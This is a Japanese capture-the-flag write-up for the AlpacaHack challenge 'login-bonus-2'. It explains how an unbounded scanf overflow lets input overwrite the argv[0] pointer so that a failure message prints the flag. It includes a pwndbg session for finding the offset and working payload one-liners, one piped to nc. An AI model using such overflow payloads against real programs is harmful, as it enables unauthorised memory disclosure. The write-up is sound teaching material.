# login-bonus-2

https://alpacahack.com/daily/challenges/login-bonus-2

## 問題の概要

バッファオーバーランでフラグを吐かせる PWN 問題です。

`scanf("%[^\n]", password)` でローカル変数 `char password[100]` に入力を読み込み、フラグが読み込まれているグローバル変数 `char g_flag[100]` と一致していればフラグが表示され、そうでなければ `printf("%s: Auth NG\n", argv[0])` が表示されます。

### バイナリ情報

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

## 解法

`scanf` で文字数を制限していないので、バッファオーバーランでスタックを上書きできます。

`argv` や環境変数はプロセス起動直後のユーザースタック上に配置されるため、`argv[0]` が指すアドレスを `g_flag` のアドレスに書き換えれば "Auth NG" を出力するときにフラグを表示させることができます。

<table border="1" cellspacing="0" cellpadding="6" style="border-collapse: collapse; text-align: left;">
  <tr>
    <th>アドレス</th>
    <th colspan="2">内容</th>
  </tr>
  <tr>
    <td>↑低位(0000)</td>
  </tr>
  <tr>
    <td align="right">rsp→</td>
    <td rowspan="4">main の<br>スタックフレーム</td>
    <td>ローカル変数</td>
  </tr>
  <tr>
    <td></td>
    <td>...</td>
  </tr>
  <tr>
    <td></td>
    <td>stack canary</td>
  </tr>
  <tr>
    <td align="right">rbp→</td>
    <td>旧 rbp</td>
  </tr>
  <tr>
    <td></td>
    <td rowspan="2">main 以前の<br>スタックフレーム<br>...</td>
    <td>return address</td>
  </tr>
  <tr>
    <td></td>
    <td>...<br></td>
  </tr>
  <tr>
    <td></td>
    <td rowspan="5">引数</td>
    <td>argc</td>
  </tr>
  <tr>
    <td></td>
    <td>argv[0] へのポインタ</td>
  </tr>
  <tr>
    <td></td>
    <td>argv[1] へのポインタ</td>
  </tr>
  <tr>
    <td></td>
    <td>...</td>
  </tr>
  <tr>
    <td></td>
    <td>NULL(argv の終端)</td>
  </tr>
  <tr>
    <td></td>
    <td rowspan="4">環境変数</td>
    <td>envp[0] へのポインタ</td>
  </tr>
  <tr>
    <td></td>
    <td>envp[1] へのポインタ</td>
  </tr>  <tr>
    <td></td>
    <td>...</td>
  </tr>
  <tr>
    <td></td>
    <td>NULL(envp の終端)</td>
  </tr>
  <tr>
    <td></td>
    <td rowspan="3">auxv</td>
    <td>AT_* の補助ベクトル</td>
  </tr>
  <tr>
    <td></td>
    <td>...</td>
  </tr>
  <tr>
    <td></td>
    <td>AT_NULL</td>
  </tr>
  <tr>
    <td></td>
    <td >文字列本体</td>
    <td>argv[0], envp[0] <br>などが指す文字列のバイト列</td>
  </tr>
  <tr>
    <td>↓高位(FFFF)</td>
    <td></td>
    <td></td>
  </tr>
</table>

Stack Canary を含めてスタックの内容を破壊しつくしますが、クラッシュする前にフラグが表示されるので問題ありません。

pwndbg で cyclic パターンを入力し、 `printf("%s: Auth NG\n", argv[0])` が呼ばれる直前の 引数を確認することで、入力の何バイト目が `argv[0]` のアドレスに対応しているかを特定できます。

```bash
$ pwndbg login
pwndbg> cyclic 500 cyclic.txt
Written a cyclic sequence of length 500 to file cyclic.txt
pwndbg> break *main+108
Breakpoint 1 at 0x401212
pwndbg> run < cyclic.txt
...
Breakpoint hit at 0x401212
...
► 0x401212 <main+108>    call   printf@plt                  <printf@plt>
        format: 0x402015 ◂— '%s: Auth NG\n'
        rsi: 0x6261616161616179 ('yaaaaaab')
...
pwndbg> cyclic --lookup yaaaaaab
Finding cyclic pattern of 8 bytes: b'yaaaaaab' (hex: 0x7961616161616162)
Found at offset 392

pwndbg> info address g_flag
Symbol "g_flag" is at 0x404040 in a file compiled without debugging.
```

入力の392バイト目から `g_flag` のアドレスをリトルエンディアンで書き込むと、フラグが表示されます。(入力の終わりは `\n` = `\x0a` です)

```bash
$ (yes "00" | head -n 392; echo "40 40 40 00  00 00 00 00  0a") | xxd -r -p | ./login
Password: FLAG{dummy}: Auth NG
FLAG{dummy}: Invalid password:
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

ローカルの環境だとオフセットは 392 で成功していたのですが、なぜか分かりませんが問題サーバー環境ではスタックの内容が異なっているらしく、うまくいきませんでした。

面倒なので `g_flag` のアドレスを Seg Fault が起きない程度に繰り返したパターンを投げます。スタックの配置は大抵 8 バイト単位にアライメントされているので、繰り返したアドレスのどこかが `argv[0]` にあたるはずです。

```bash
(yes "40 40 40 00  00 00 00 00" | head -n 100 | xxd -r -p; echo) | nc ....
```

無事にフラグが表示されました。
